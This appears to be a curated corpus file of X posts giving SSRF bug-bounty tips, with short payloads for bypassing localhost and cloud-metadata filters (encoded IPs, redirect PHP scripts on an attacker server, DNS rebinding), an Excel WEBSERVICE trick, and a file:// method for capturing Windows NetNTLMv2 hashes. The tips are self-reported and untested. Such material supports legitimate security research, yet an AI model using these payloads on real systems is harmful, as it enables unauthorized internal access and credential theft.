# X 经验语料 · ssrf

来源：X 公开贴子，经逐条判定后归入「经验」桶。
这些贴子给出做法/判断经验，但缺少可直接复现的完整载荷链；
与 x-<类>-*.md（技术桶，含具体载荷）配合阅读。
仅纯文本，图片与外部媒体已剥离。作者自述，未经复现验证。

> 原贴时间跨度为 2019-2026，条目均为作者自述、未经复现验证；部分技巧可能已随产品版本失效。
> 判定协议：[SSRF](../by-type/ssrf.md) · 索引与计数：[x-corpus.md](x-corpus.md) · 同类：x-ssrf-1（54 条）、x-residual-ssrf（10 条） · 本文 120 行

- If an app accepts XLSX to convert to PDF/HTML it may run the file through MS Excel to eval formulas/convert. Try testing =WEBSERVICE(http://google.com) and see if XML/HTML is added to the form (insta-SSRF). No clue excel even had this function
- If you don't have BurpSuitPro and cant use collaborator to test for blind ssrf dont worry then try this sites.
  https://ssrftest.com
- Blog post on SSRF and on how to NOT report a bug:
  https://medium.com/@leviwof/bug-bounty-failsx101-3-199b50ce7f4e
- When you find a public form (contact form,etc.) try these payloads (blind ssrf), if you receive a request on your server, try SSTI...
- Tried to do internal port scan and it was working! There was time delay between fetching an open port and a closed one. Blind SSRF confirmed.
- Trying an SSRF but it is obscured?
  Try these for localhost:
  Decimal IP: http://0177.0.0.1
  Rare address: http://0 / http://0x7f.0x1.0x1
  Guess what these represent too... http://2130706433 / http://017700000001
- Suppose you want to test for SSRF on a filtered internal server (169.254.169.254).
  Try:
  If it checks for the start:
  http://fake-site.com.169.254.169.254.xip.io
  OR
  If it checks for the start & end:
  http://fake-site.169.254.169.254.xip.io+&@169.254.169.254:22/#+@fake-site.com:80/
- First i thought it is blind, But i found burp-collaborator response in page source.
  Requested: anything","169.254.169.254
  Got aws directories
- Ssrf/XSPA + blind rce
  -website fetching image though url
  -paste burplink/
  -got dns and https after that paste burp collab:25
  -got smtp
  -scan ports with burp intruder
  -further exploited with blind rce
  ping+burplink/ got dns only
- So this is my write up of the recent pdf converter ssrf I found with various bypasses and exploitation.
  https://nandwanajatin25.medium.com/a-tale-of-html-to-pdf-converter-ssrf-and-various-bypasses-4a3e11030c77
- Chaining Minor Bugs For High Impact
  When you find a low-severity bug that might be dismissed, don't report it immediately. Try to use it in future bug chains instead. For example, instead of reporting an open redirect, use it in a SSRF attack!
- If you ever find a SSRF on a Windows box, try running http://responder.py on your own VPS, then send the SSRF to file://<yourvps>. With a bit of luck, the server will send you some tasty Windows NetNTLMv2 hashes to crack
- This is the first critical vulnerability that I have discovered a year ago. I was able to gain RCE with 2 different methods.
  https://itsfading.github.io/posts/Unrestricted-File-Upload-Leads-to-SSRF-and-RCE/
- If you ever found ssrf & failed to access internally hosted web services then always search localhost & 127.0.0.1 in main.js or in app.js, you may end up in accessing internal web resources.
- Tip: When hunting for SSRF in web apps, pay close attention to the responses. If you are getting blocked, check for DNS rebinding!
  2 bugs this week with SSRF protection, but no protection against SSRF when chained into DNS rebind
- Final crafted payload for Bypassing waf by querying metadata by localhost i.e
  http://test,com/image?url=http://localhost/image?url=http://169.254.169.254 (including headers)
  By using this payload I bypassed waf and got metadata
- Single redirection SSRF filter bypass
  If localhost & metadata calling is restricted then try this: save this code as 1.php in attacker server
  <?php
   header('location: http://127.0.0.1');
  ?>
  Now try target,com/image?url=http://attaker/1.php
- If the above thing does not works then try this. Save this code as 2.php in attacker server
  <?php
   header('location: http://attacker/1.php');
  ?>
  Now try target,com/image?url=http://attaker/2.php
  The same thing applies for 169.254.169.254
- Chain AutoRepeater and Taborator to Automate SSRF Findings. Created by: @bsysop
- If you find the host hosting the WordPress CMS, then try to see if xmlrpc.php is open
  Then, through the PingBack function, you can get Blind SSRF
- what they didnt teach you in SSRF! the most forgotable range within the blacklist protections and firewalls, allways try Class B range which is 172.16.0.0/*
- Found a JIRA SSRF and want to make it more impactful? Look for what's running on port 7990, you might end up in a BitBucket server running internally with public repo access. If yes, source code is just a few hacks away.
- If you have a blind SSRF that can only read images (but for some reason can't read ICO files), try and find Confluence running on the internal network and request /images/icons/ to prove that you can access internal resources
- Easily evade URL/SSRF filters!
  Try out ipfuscator to rapidly create alternative IP(V4) address representations using conversion & manipulation methods.
  https://github.com/dwisiswant0/ipfuscator
- A SSRF testing server: you can personalize responses with custom headers and status codes. It's also handy for hosting files like JS or XML while exploiting SSRF.
  https://ssrf.cvssadvisor.com
- If you see android:exported="true" in AndroidManifest.xml in Android pentests, you should definitely try the intent injection method, this may give you ssrf, exfiltration sensitive data, rce.
- Vuln: Semi-Blind SSRF on a migration server functionality. The filter in place rejected loopback addresses but granted http://0.0.0.0 which gets redirected to 127.0.0.1
- Bug: Semi-Blind SSRF on an event call functionality.
  This was a bypass from a previous submitted SSRF. This time I bypassed it setting a A DNS record pointed to 127.0.0.1
- Found SSRF and want to increase the impact?
  Send the http request to http://webhook.site and check the User-Agent of the server. Sometimes you'll find open source libraries with known vulnerabilities!
- Found a potential point for SSRF but got blocked for 127.0.0.1 and its conversions like 2130706433 (decimal)?
  Try to use the IP range 127.0.0.0/8 to bypass the blacklist of IPs!
  127.127.127.127 - This one got me a CVE
- ssrftips
  1. Find request w url param and replace the url with your server.
  2. Check your server logs, if the IP is coming from your IP, SSRF is usually not possible.
  3. If the request to your server is coming from a different Ip address thats a good sign.
  4. Change url to internal ips/hosts (127.0.0.1 169.254.169.254). If blocked, try decimal encoding bc this works for me 85% of the time for ssrf. Also fuzz for diff ports.
- Bug Hunting Tip
  If you have a Blind-SSRF, following are 3 ways to test for OS Command Injections, for OOB (Out of Band) data exfiltration.
  You can use Interactsh web client (http://app.interactsh.com) for HTTP and DNS external interaction.
- For SSRF checks, if your target is using a major provider like AWS, Azure etc... always test provider domains first before the normal SSRF wordlists. Major providers are known to whitelist a network of customer domains which can be used to validate SSRF.
- By testing for SSRF be on the lookout of any Axios User-Agent, these instances follow redirects by default, which devs sometimes don't know.
  So, there's a high chance defenses could be bypassed setting the evil host after the redirection.
  Don't forget 301,308
- Exploiting PDF Generators
  If a web application can generate PDFs make sure you look for LFI and SSRF. Its an easy HIGH severity finding.
  Learn more on my blog: https://ghostlulz.com/blog/exploiting-pdf-generators
- If you are testing SSRF, Request Smuggling, or any other internal redirections or second-order exploitation, *ALWAYS* try with domains that are part of the same service (whitelisted)...
  Azure? use azurefd[.]net
  Akamai? use akamai hosted
  CF? use CF hosted, etc...
- Dig Deep for SSRF Bugs
  - Find url=, domain=, path= parameters
  - Test cloud metadata IPs (AWS: 169.254.169.254)
  - Try protocols: file://, gopher://
  - Burp Collaborator = best friend for blind SSRF
  - Analyze image converters
- If you find a bug that seems unique to one target, always check other targets using the same tech stack and/or cloud provider. What looks like a one-off issue can reveal a widespread infrastructure flaw, especially when testing SSRF or Request Smuggling bugs.
- LFI via misconfigured image parameter
  In most of cases hackers only test blind SSRF in image handler parameter.
  But if you test the right payload it can disclose many hidden bugs!
- Learn SSRF
  [+] https://portswigger.net/web-security/ssrf
  [X] https://book.hacktricks.xyz/.../ssrf-server-side-request
  [*] https://gowthams.gitbook.io/.../list-of.../ssrf
  Tryhackme Lab:
  1. https://tryhackme.com/r/room/ssrfqi
  2. https://tryhackme.com/r/room/ssrfhr
